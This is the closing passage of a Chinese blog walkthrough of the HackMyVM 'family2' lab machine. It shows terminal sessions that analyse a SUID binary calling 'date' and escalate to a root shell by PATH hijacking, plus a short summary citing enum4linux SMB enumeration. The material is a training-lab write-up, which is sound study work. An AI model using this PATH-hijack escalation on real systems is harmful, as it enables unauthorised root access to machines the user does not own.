+<figure class="highlight x86asm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br></pre></td><td class="code"><pre><span class="line">┌──(root㉿kakeru)-[~/tmp]</span><br><span class="line">└─# wget <span class="number">192.168</span><span class="number">.112</span><span class="number">.61</span>:<span class="number">8000</span>/clock</span><br><span class="line">--<span class="number">2025</span>-<span class="number">02</span>-<span class="number">13</span> <span class="number">17</span>:<span class="number">07</span>:<span class="number">13</span>--  http://<span class="number">192.168</span><span class="number">.112</span><span class="number">.61</span>:<span class="number">8000</span>/clock</span><br><span class="line">Connecting to <span class="number">192.168</span><span class="number">.112</span><span class="number">.61</span>:<span class="number">8000</span>... connected.</span><br><span class="line">HTTP request sent, awaiting response... <span class="number">200</span> OK</span><br><span class="line"><span class="symbol">Length:</span> <span class="number">16096</span> (16K) [application/octet-stream]</span><br><span class="line">Saving to: ‘clock’</span><br><span class="line"></span><br><span class="line">clock                        <span class="number">100</span>%[=============================================&gt;]  <span class="number">15.</span>72K  --.-KB/s    <span class="keyword">in</span> 0s      </span><br><span class="line"></span><br><span class="line"><span class="number">2025</span>-<span class="number">02</span>-<span class="number">13</span> <span class="number">17</span>:<span class="number">07</span>:<span class="number">14</span> (<span class="number">33.2</span> MB/s) - ‘clock’ saved [<span class="number">16096</span>/<span class="number">16096</span>]</span><br><span class="line"></span><br><span class="line">                                                                                                                   </span><br><span class="line">┌──(root㉿kakeru)-[~/tmp]</span><br><span class="line">└─# strings clock                    </span><br><span class="line">/lib64/ld-linux-x86-<span class="number">64.</span>so<span class="number">.2</span></span><br><span class="line">setresuid</span><br><span class="line">system</span><br><span class="line">__cxa_finalize</span><br><span class="line">__libc_start_main</span><br><span class="line">libc<span class="number">.</span>so<span class="number">.6</span></span><br><span class="line">GLIBC_2<span class="number">.2</span><span class="number">.5</span></span><br><span class="line">_ITM_deregisterTMCloneTable</span><br><span class="line">__gmon_start__</span><br><span class="line">_ITM_registerTMCloneTable</span><br><span class="line">u/UH</span><br><span class="line">[]A\A]A^A_</span><br><span class="line">date</span><br><span class="line"><span class="comment">;*3$&quot;</span></span><br><span class="line"><span class="symbol">GCC:</span> (Debian <span class="number">10.3</span><span class="number">.0</span>-<span class="number">11</span>) <span class="number">10.3</span><span class="number">.0</span></span><br><span class="line">Scrt1<span class="number">.</span>o</span><br><span class="line">__abi_tag</span><br><span class="line">crtstuff<span class="number">.</span>c</span><br><span class="line">deregister_tm_clones</span><br><span class="line">__do_global_dtors_aux</span><br><span class="line">completed<span class="number">.0</span></span><br><span class="line">__do_global_dtors_aux_fini_array_entry</span><br><span class="line">frame_dummy</span><br><span class="line">__frame_dummy_init_array_entry</span><br><span class="line">suid<span class="number">.</span>c</span><br><span class="line">__FRAME_END__</span><br><span class="line">__init_array_end</span><br><span class="line">_DYNAMIC</span><br><span class="line">__init_array_start</span><br><span class="line">__GNU_EH_FRAME_HDR</span><br><span class="line">_GLOBAL_OFFSET_TABLE_</span><br><span class="line">__libc_csu_fini</span><br><span class="line">_ITM_deregisterTMCloneTable</span><br><span class="line">setresuid@GLIBC_2<span class="number">.2</span><span class="number">.5</span></span><br><span class="line">_edata</span><br><span class="line">system@GLIBC_2<span class="number">.2</span><span class="number">.5</span></span><br><span class="line">__libc_start_main@GLIBC_2<span class="number">.2</span><span class="number">.5</span></span><br><span class="line">__data_start</span><br><span class="line">__gmon_start__</span><br><span class="line">__dso_handle</span><br><span class="line">_IO_stdin_used</span><br><span class="line">__libc_csu_init</span><br><span class="line">__bss_start</span><br><span class="line">main</span><br><span class="line">__TMC_END__</span><br><span class="line">_ITM_registerTMCloneTable</span><br><span class="line">__cxa_finalize@GLIBC_2<span class="number">.2</span><span class="number">.5</span></span><br><span class="line"><span class="meta">.symtab</span></span><br><span class="line"><span class="meta">.strtab</span></span><br><span class="line"><span class="meta">.shstrtab</span></span><br><span class="line"><span class="meta">.interp</span></span><br><span class="line"><span class="meta">.note</span><span class="number">.</span>gnu<span class="number">.</span>build-id</span><br><span class="line"><span class="meta">.note</span><span class="number">.</span>ABI-tag</span><br><span class="line"><span class="meta">.gnu</span><span class="number">.</span>hash</span><br><span class="line"><span class="meta">.dynsym</span></span><br><span class="line"><span class="meta">.dynstr</span></span><br><span class="line"><span class="meta">.gnu</span><span class="number">.</span>version</span><br><span class="line"><span class="meta">.gnu</span><span class="number">.</span>version_r</span><br><span class="line"><span class="meta">.rela</span><span class="number">.</span>dyn</span><br><span class="line"><span class="meta">.rela</span><span class="number">.</span>plt</span><br><span class="line"><span class="meta">.init</span></span><br><span class="line"><span class="meta">.plt</span><span class="number">.</span>got</span><br><span class="line"><span class="meta">.text</span></span><br><span class="line"><span class="meta">.fini</span></span><br><span class="line"><span class="meta">.rodata</span></span><br><span class="line"><span class="meta">.eh_frame_hdr</span></span><br><span class="line"><span class="meta">.eh_frame</span></span><br><span class="line"><span class="meta">.init_array</span></span><br><span class="line"><span class="meta">.fini_array</span></span><br><span class="line"><span class="meta">.dynamic</span></span><br><span class="line"><span class="meta">.got</span><span class="number">.</span>plt</span><br><span class="line"><span class="meta">.data</span></span><br><span class="line"><span class="meta">.bss</span></span><br><span class="line"><span class="meta">.comment</span></span><br></pre></td></tr></table></figure>
+<p>里面的指令是<code>date</code><br>我们去执行这个程序看看能得到什么</p>
+<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="APACHE"><figure class="iseeu highlight /apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">dad</span>@family2:/opt$ ./clock </span><br><span class="line"><span class="attribute">Thu</span> <span class="number">13</span> Feb <span class="number">2025</span> <span class="number">10</span>:<span class="number">09</span>:<span class="number">26</span> AM CET</span><br></pre></td></tr></table></figure></div>
+<p>发现就是查看时间<br>现在我们只要劫持这个date就好了，把data替换成我们需要执行的bash脚本就好了</p>
+<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="RUBY"><figure class="iseeu highlight /ruby"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">dad<span class="variable">@family2</span><span class="symbol">:/opt</span><span class="variable">$ </span>echo <span class="string">&quot;/bin/bash&quot;</span> &gt; date</span><br><span class="line"><span class="symbol">bash:</span> <span class="symbol">date:</span> <span class="title class_">Permission</span> denied</span><br><span class="line">dad<span class="variable">@family2</span><span class="symbol">:/opt</span><span class="variable">$ </span>cd /home/dad</span><br><span class="line">dad<span class="variable">@family2</span><span class="symbol">:~</span><span class="variable">$ </span>echo <span class="string">&quot;/bin/bash&quot;</span> &gt; date</span><br><span class="line">dad<span class="variable">@family2</span><span class="symbol">:~</span><span class="variable">$ </span><span class="variable constant_">PATH</span>=^C</span><br><span class="line">.bash_history    .bashrc          .local/          .python_history  </span><br><span class="line">.bash_logout     date             .profile         user.txt         </span><br><span class="line">dad<span class="variable">@family2</span><span class="symbol">:~</span><span class="variable">$ </span><span class="variable constant_">PATH</span>=<span class="regexp">/home/dad</span><span class="symbol">:</span><span class="variable">$PATH</span></span><br><span class="line"></span><br><span class="line">dad<span class="variable">@family2</span><span class="symbol">:~</span><span class="variable">$ </span>/opt/clock</span><br><span class="line"><span class="title class_">Thu</span> <span class="number">13</span> <span class="title class_">Feb</span> <span class="number">2025</span> <span class="number">10</span><span class="symbol">:</span><span class="number">11</span><span class="symbol">:</span><span class="number">39</span> <span class="variable constant_">AM</span> <span class="variable constant_">CET</span></span><br><span class="line">dad<span class="variable">@family2</span><span class="symbol">:~</span><span class="variable">$ </span>chmod +x date</span><br><span class="line">dad<span class="variable">@family2</span><span class="symbol">:~</span><span class="variable">$ </span>/opt/clock</span><br><span class="line"><span class="title class_">Thu</span> <span class="number">13</span> <span class="title class_">Feb</span> <span class="number">2025</span> <span class="number">10</span><span class="symbol">:</span><span class="number">12</span><span class="symbol">:</span><span class="number">01</span> <span class="variable constant_">AM</span> <span class="variable constant_">CET</span></span><br><span class="line">dad<span class="variable">@family2</span><span class="symbol">:~</span><span class="variable">$ </span>export <span class="variable constant_">PATH</span>=<span class="regexp">/home/dad</span><span class="symbol">:</span><span class="variable">$PATH</span></span><br><span class="line">dad<span class="variable">@family2</span><span class="symbol">:~</span><span class="variable">$ </span>/opt/clock</span><br><span class="line">root<span class="variable">@family2</span><span class="symbol">:~</span><span class="comment"># </span></span><br></pre></td></tr></table></figure></div>
+<p>这样子把环境变量改成用我们目录下的date，然后内容是<code>/bin/bash</code>这样就直接得到root的shell了</p>
+<h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>这个靶机还是挺好玩的，结合了很多小知识点，这里web端就直接给了id_rsa,总体难度还是比family1简单一点。<br>学到了用<code>enum4linux -a</code> 这个方法扫描所有有smb的靶机，得到用户名<br>提权部分是主要考查环境变量，加深我们对环境变量的理解，用PATH劫持获得shell</p>
+
+    </div>
+
+    
+    
+    
+        
+
+<div>
+<ul class="post-copyright">
+  <li class="post-copyright-author">
+    <strong>本文作者： </strong>guayu-kakeru
+  </li>
+  <li class="post-copyright-link">
+    <strong>本文链接：</strong>
+    <a href="https://guayu-kakeru.github.io/posts/55076.html" title="HMV-family2">https://guayu-kakeru.github.io/posts/55076.html</a>
+  </li>
+  <li class="post-copyright-license">
+    <strong>版权声明： </strong>本博客所有文章除特别声明外，均采用 <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/" rel="noopener" target="_blank"><i class="fab fa-fw fa-creative-commons"></i>BY-NC-SA</a> 许可协议。转载请注明出处！
+  </li>
+</ul>
+</div>
+
+
+      <footer class="post-footer">
+          <div class="post-tags">
+              <a href="/tags/%E6%B8%97%E9%80%8F/" rel="tag"># 渗透</a>
+              <a href="/tags/HMV/" rel="tag"># HMV</a>
+              <a href="/tags/%E9%9D%B6%E5%9C%BA/" rel="tag"># 靶场</a>
+          </div>
+
+        
+
+
+        
+    <div class="post-nav">
+      <div class="post-nav-item">
+    <a href="/posts/9478.html" rel="prev" title="HMV-family">
+      <i class="fa fa-chevron-left"></i> HMV-family
+    </a></div>
+      <div class="post-nav-item">
+    <a href="/posts/25446.html" rel="next" title="SWPUCTF_2021新生赛(web)WP">
+      SWPUCTF_2021新生赛(web)WP <i class="fa fa-chevron-right"></i>
+    </a></div>
+    </div>
+      </footer>
+    
+  </article>
+  
+  
+  
+
+
+
+          </div>
+          
+
+<script>
+  window.addEventListener('tabs:register', () => {
+    let { activeClass } = CONFIG.comments;
+    if (CONFIG.comments.storage) {
+      activeClass = localStorage.getItem('comments_active') || activeClass;
+    }
+    if (activeClass) {
+      let activeTab = document.querySelector(`a[href="#comment-${activeClass}"]`);
+      if (activeTab) {
+        activeTab.click();
+      }
+    }
+  });
+  if (CONFIG.comments.storage) {
+    window.addEventListener('tabs:click', event => {
+      if (!event.target.matches('.tabs-comment .tab-content .tab-pane')) return;
+      let commentClass = event.target.classList[1];
+      localStorage.setItem('comments_active', commentClass);
+    });
+  }
+</script>
+
+        </div>
+          
+  
+  <div class="toggle sidebar-toggle">
+    <span class="toggle-line toggle-line-first"></span>
+    <span class="toggle-line toggle-line-middle"></span>
+    <span class="toggle-line toggle-line-last"></span>
+  </div>
+
+  <aside class="sidebar">
+    <div class="sidebar-inner">
+
+      <ul class="sidebar-nav motion-element">
+        <li class="sidebar-nav-toc">
+          文章目录
+        </li>
+        <li class="sidebar-nav-overview">
+          站点概览
+        </li>
+      </ul>
+
+      <!--noindex-->
+      <div class="post-toc-wrap sidebar-panel">
+          <div class="post-toc motion-element"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#%E7%AB%AF%E5%8F%A3%E6%89%AB%E6%8F%8F"><span class="nav-text">端口扫描</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86"><span class="nav-text">信息收集</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#%E6%8F%90%E6%9D%83"><span class="nav-text">提权</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#baby"><span class="nav-text">baby</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#mum"><span class="nav-text">mum</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#dad"><span class="nav-text">dad</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E6%80%BB%E7%BB%93"><span class="nav-text">总结</span></a></li></ol></li></ol></div>
+      </div>
+      <!--/noindex-->
+
+      <div class="site-overview-wrap sidebar-panel">
+        <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
+    <img class="site-author-image" itemprop="image" alt="guayu-kakeru"
+      src="/images/avatar.jpg">
+  <p class="site-author-name" itemprop="name">guayu-kakeru</p>
+  <div class="site-description" itemprop="description">一年过后，你会希望从今天就开始行动。</div>
+</div>
+<div class="site-state-wrap motion-element">
+  <nav class="site-state">
+      <div class="site-state-item site-state-posts">
+          <a href="/archives/">
+        
+          <span class="site-state-item-count">44</span>
+          <span class="site-state-item-name">日志</span>
+        </a>
+      </div>
+      <div class="site-state-item site-state-categories">
+            <a href="/categories/">
+          
+        <span class="site-state-item-count">9</span>
+        <span class="site-state-item-name">分类</span></a>
+      </div>
+      <div class="site-state-item site-state-tags">
+            <a href="/tags/">
+          
+        <span class="site-state-item-count">12</span>
+        <span class="site-state-item-name">标签</span></a>
+      </div>
+  </nav>
+</div>
+  <div class="links-of-author motion-element">
+      <span class="links-of-author-item">
+        <a href="https://github.com/guayukakeru" title="GitHub → https:&#x2F;&#x2F;github.com&#x2F;guayukakeru" rel="noopener" target="_blank"><i class="fab fa-github fa-fw"></i>GitHub</a>
+      </span>
+      <span class="links-of-author-item">
+        <a href="/1806449041@qq.com" title="E-Mail → 1806449041@qq.com"><i class="fa fa-envelope fa-fw"></i>E-Mail</a>
+      </span>
+  </div>
+
+
+
+  <div class="links-of-recent-posts motion-element">
+    <div class="links-of-recent-posts-title">
+      <i class="fa fa-history fa-fw"></i>
+      最近文章
+    </div>
+    <ul class="links-of-recent-posts-list">
+        <li class="links-of-recent-posts-item">
+          <a href="/posts/48411.html" title="posts&#x2F;48411.html">HMV-Five</a>
+        </li>
+        <li class="links-of-recent-posts-item">
+          <a href="/posts/38113.html" title="posts&#x2F;38113.html">SWPUCTF_2022新生赛(web)WP</a>
+        </li>
+        <li class="links-of-recent-posts-item">
+          <a href="/posts/50600.html" title="posts&#x2F;50600.html">HMV-insomnia</a>
+        </li>
+        <li class="links-of-recent-posts-item">
+          <a href="/posts/62818.html" title="posts&#x2F;62818.html">寒假总结</a>
+        </li>
+        <li class="links-of-recent-posts-item">
+          <a href="/posts/25446.html" title="posts&#x2F;25446.html">SWPUCTF_2021新生赛(web)WP</a>
+        </li>
+    </ul>
+  </div>
+      </div>
+
+      
+      
+        <div class="links-of-blogroll motion-element links-of-blogroll-undefined">
+          <div class="links-of-blogroll-title">
+            <i class="fa fa-history fa-" aria-hidden="true"></i>
+            
+          </div>
+          <ul class="links-of-blogroll-list">
+            
+            
+              <li class="recent_posts_li">
+                <a href="/" title="" target="_blank"></a>
+              </li>
+            
+              <li class="recent_posts_li">
+                <a href="/" title="" target="_blank"></a>
+              </li>
+            
+              <li class="recent_posts_li">
+                <a href="/" title="" target="_blank"></a>
+              </li>
+            
+              <li class="recent_posts_li">
+                <a href="/" title="" target="_blank"></a>
+              </li>
+            
+              <li class="recent_posts_li">
+                <a href="/" title="" target="_blank"></a>
+              </li>
+            
+          </ul>
+        </div>
+      
+    </div>
+  </aside>
+  <div id="sidebar-dimmer"></div>
+
+
+      </div>
+    </main>
+
+    <footer class="footer">
+      <div class="footer-inner">
+        
+
+        
+
+<div class="copyright">
+  
+  &copy; 
+  <span itemprop="copyrightYear">2025</span>
+  <span class="with-love">
+    <i class="fa fa-heart"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">guayu-kakeru</span>
+</div>
+
+
+
+        
+<div class="busuanzi-count">
+  <script async src="https://busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+    <span class="post-meta-item" id="busuanzi_container_site_uv" style="display: none;">
+      <span class="post-meta-item-icon">
+        <i class="fa fa-user"></i>
+      </span>
+      <span class="site-uv" title="总访客量">
+        <span id="busuanzi_value_site_uv"></span>
+      </span>
+    </span>
+    <span class="post-meta-divider">|</span>
+    <span class="post-meta-item" id="busuanzi_container_site_pv" style="display: none;">
+      <span class="post-meta-item-icon">
+        <i class="fa fa-eye"></i>
+      </span>
+      <span class="site-pv" title="总访问量">
+        <span id="busuanzi_value_site_pv"></span>
+      </span>
+    </span>
+</div>
+
+
+
+
+
+
+
+
+      </div>
+    </footer>
+  </div>
+
+  
+  <script src="/lib/anime.min.js"></script>
+  <script src="/lib/velocity/velocity.min.js"></script>
+  <script src="/lib/velocity/velocity.ui.min.js"></script>
+
+<script src="/js/utils.js"></script>
+
+<script src="/js/motion.js"></script>
+
+
+<script src="/js/schemes/pisces.js"></script>
+
+
+<script src="/js/next-boot.js"></script>
+
+
+
+
+  
+
+
+
+
+  
+<script src="/js/local-search.js"></script>
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+
+  
+
+</body>
+</html>
